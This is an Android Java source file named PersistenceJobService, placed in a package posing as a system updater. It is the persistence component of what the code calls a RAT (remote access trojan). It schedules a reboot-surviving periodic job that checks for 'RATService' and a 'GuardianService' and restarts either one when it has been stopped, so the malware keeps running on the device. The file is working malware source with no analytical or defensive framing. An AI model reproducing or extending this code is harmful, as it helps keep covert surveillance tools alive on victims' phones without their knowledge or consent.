package com.android.system.update;

import android.app.ActivityManager;
import android.app.job.JobInfo;
import android.app.job.JobParameters;
import android.app.job.JobScheduler;
import android.app.job.JobService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

import java.util.List;

public class PersistenceJobService extends JobService {
    
    private static final int JOB_ID = 1001;
    
    @Override
    public boolean onStartJob(JobParameters params) {
        // Check if main service is running
        if (!isServiceRunning(RATService.class)) {
            // Restart it
            restartRATService();
        }
        
        // Check if guardian service is running
        if (!isServiceRunning(GuardianService.class)) {
            // Restart guardian
            restartGuardianService();
        }
        
        // Schedule next check
        scheduleJob();
        
        // Tell the system we're done
        jobFinished(params, false);
        return true;
    }
    
    @Override
    public boolean onStopJob(JobParameters params) {
        // Reschedule if job stops
        scheduleJob();
        return true;
    }
    
    private void scheduleJob() {
        JobScheduler jobScheduler = (JobScheduler) getSystemService(Context.JOB_SCHEDULER_SERVICE);
        
        JobInfo.Builder builder = new JobInfo.Builder(JOB_ID, 
                new ComponentName(this, PersistenceJobService.class))
                .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                .setPersisted(true) // Survives reboot
                .setBackoffCriteria(10000, JobInfo.BACKOFF_POLICY_EXPONENTIAL); // Retry with backoff
        
        // Set periodic check (minimum interval is 15 minutes for Android 8+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            builder.setPeriodic(15 * 60 * 1000, 5 * 60 * 1000); // 15 min with 5 min flex
        } else {
            builder.setPeriodic(15 * 60 * 1000); // 15 minutes
        }
        
        // Add device idle requirement to be more battery efficient
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            builder.setRequiresDeviceIdle(false);
        }
        
        jobScheduler.schedule(builder.build());
    }
    
    private void restartRATService() {
        Intent intent = new Intent(this, RATService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }
    
    private void restartGuardianService() {
        Intent intent = new Intent(this, GuardianService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }
    
    private boolean isServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : 
                manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }
}
